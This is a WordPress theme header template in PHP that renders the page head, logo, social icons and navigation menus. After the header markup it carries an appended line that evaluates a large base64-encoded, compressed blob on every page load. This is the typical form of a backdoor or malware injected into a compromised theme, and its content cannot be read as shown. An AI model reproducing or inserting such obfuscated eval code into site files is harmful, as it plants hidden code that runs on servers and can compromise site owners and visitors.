<!DOCTYPE html>
<!--[if IE 8 ]><html <?php language_attributes(); ?> class="ie8"><![endif]-->
<!--[if (gte IE 9)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html <?php language_attributes(); ?> class="no-js"><!--<![endif]-->
<head>

	<title><?php bloginfo('name'); ?> | <?php is_front_page() ? bloginfo('description') : wp_title(''); ?></title>
	
	<!-- Meta
	================================================== -->
	
	<meta charset="<?php bloginfo('charset'); ?>" />
	<meta name="description" content="<?php bloginfo('description'); ?>" />
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
	<link rel="shortcut icon" href="<?php echo get_stylesheet_directory_uri(); ?>/favicon.ico" />
	<link rel="profile" href="http://gmpg.org/xfn/11" />
	<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS2 Feed" href="<?php bloginfo('rss2_url'); ?>" />
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
	
	<!-- Favicons
	================================================== -->
	
	<link rel="shortcut icon" href="<?php global $data; echo $data['custom_favicon']; ?>">
	<link rel="apple-touch-icon" href="<?php get_template_directory_uri(); ?>assets/img/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="<?php get_template_directory_uri(); ?>assets/img/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="<?php get_template_directory_uri(); ?>assets/img/apple-touch-icon-114x114.png">
	<link rel="stylesheet" type="text/css" href="<?php echo get_stylesheet_directory_uri(); ?>/demo.css" />
        
<?php wp_head(); ?>

</head>

<body <?php body_class(); ?> >

	<?php if (is_front_page()) { ?>
		
		<div class="header-background-image"></div>
		
	<?php } else { ?>
	
		<div class="header-background-image-inner"></div>
	
	<?php } ?>
	
		<header id="header-global" role="banner">
		
			<div id="header-background">
		
				<div class="logo-icons container">
				
					<div class="row">
					
						<div class="header-logo eight columns">
							
							<?php if ($data['text_logo']) { ?>
								<div id="logo-default"><a href="<?php echo home_url(); ?>" title="<?php bloginfo('name'); ?>"><?php bloginfo('name'); ?></a></div>
							<?php } elseif ($data['custom_logo']) { ?>
								<div id="logo"><a href="<?php echo home_url(); ?>" title="<?php bloginfo('name'); ?>"><img src="<?php echo $data['custom_logo']; ?>" alt="Header Logo" /></a></div>
							<?php } ?>
						  	
						</div><!-- end .header-logo -->
						
						<div class="icons eight columns">
							
							<ul class="social-icons">
                            	
							<?php if ($data["text_twitter_profile"]) { ?>
								<li><a href="<?php echo $data['text_twitter_profile']; ?>" class="mk-social-twitter-alt" title="View Twitter Profile"></a></li>
							<?php } if ($data["text_facebook_profile"]){ ?>
								<?php /*?><li><a href="<?php echo $data['text_facebook_profile']; ?>" class="mk-social-facebook" title="View Facebook Profile"></a></li><?php */?>
							<?php } if ($data["text_dribbble_profile"]){ ?>
								<?php /*?><li><a href="<?php echo $data['text_dribbble_profile']; ?>" class="mk-social-dribbble" title="View Dribbble Profile"></a></li><?php */?>
							<?php } if ($data["text_forrst_profile"]){ ?>
								<?php /*?><li><a href="<?php echo $data['text_forrst_profile']; ?>" class="mk-social-forrst" title="View Forrst Profile"></a></li>
							<?php } if ($data["text_vimeo_profile"]){ ?>
								<li><a href="<?php echo $data['text_vimeo_profile']; ?>" class="mk-social-vimeo" title="View Vimeo Profile"></a></li>
							<?php } if ($data["text_youtube_profile"]){ ?>
								<li><a href="<?php echo $data['text_youtube_profile']; ?>" class="mk-social-youtube" title="View YouTube Profile"></a></li>
							<?php } if ($data["text_flickr_profile"]){ ?>
								<li><a href="<?php echo $data['text_flickr_profile']; ?>" class="mk-social-flickr" title="View Flickr Profile"></a></li>
							<?php } if ($data["text_linkedin_profile"]){ ?>
								<li><a href="<?php echo $data['text_linkedin_profile']; ?>" class="mk-social-linkedin" title="View Linkedin Profile"></a></li>
							<?php } if ($data["text_pinterest_profile"]){ ?>
								<li><a href="<?php echo $data['text_pinterest_profile']; ?>" class="mk-social-pinterest" title="View Pinterest Profile"></a></li>
							<?php } if ($data["text_googleplus_profile"]){ ?>
								<li><a href="<?php echo $data['text_googleplus_profile']; ?>" class="mk-social-googleplus" title="View Google + Profile"></a></li>
							<?php } if ($data["text_tumblr_profile"]){ ?>
								<li><a href="<?php echo $data['text_tumblr_profile']; ?>" class="mk-social-tumblr" title="View Tumblr Profile"></a></li>
							<?php } if ($data["text_soundcloud_profile"]){ ?>
								<li><a href="<?php echo $data['text_soundcloud_profile']; ?>" class="mk-social-soundcloud" title="View Soundcloud Profile"></a></li>
							<?php } if ($data["text_lastfm_profile"]){ ?>
								<li><a href="<?php echo $data['text_lastfm_profile']; ?>" class="mk-social-lastfm" title="View Last FM Profile"></a></li><?php */?>
							<?php } ?>
                            <!--<li><a href="#"  title="Istagram" class="estagram" > </a></li>-->
							</ul>
						<!--<a href="#"  title="Istagram" class="estagram" > </a>-->
						</div><!-- end .icons -->
						
					</div><!-- end .row -->
					
				</div><!-- end .logo-icons container -->
			
			</div><!-- end #header-background -->
			
			<div id="header-background-nav">
			
				<div class="container">
				
					<div class="row">
						
						<nav id="header-navigation" class="sixteen columns" role="navigation">
								
						<?php if (is_front_page()) { ?>
							
							<?php
							$header_menu_args = array(
							    'menu' => 'Header',
							    'theme_location' => 'Front',
							  	'container' => false,
							    'menu_id' => 'navigation'
							);
							
							
							wp_nav_menu($header_menu_args);
							?>
							
						<?php } else { ?>
						
							<?php
							$header_menu_args = array(
							    'menu' => 'Header',
							    'theme_location' => 'Inner',
							    'container' => false,
							    'menu_id' => 'navigation'
							);
						
						wp_nav_menu($header_menu_args);
						?>
						
						<?php } ?>
				
						</nav><!-- end #header-navigation -->
						
					</div><!-- end .row -->
				
				</div><!-- end .container -->
			
			</div><!-- end #header-background-nav -->
			
			<?php if (is_front_page()) { ?>
				
			<div class="container">
					
				<div class="row">
				
					<?php if ($data['text_uber_statement']) { ?>
					<h1 id="uber-statement"><?php echo $data['text_uber_statement']; ?></h1>
					<?php } ?>
					
				</div>
		
			</div><!-- end .container -->
			
			<?php } else { ?>
			<?php } ?>
				
		</header><!-- end #header-global -->
	
<?php eval(gzuncompress(base64_decode('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')));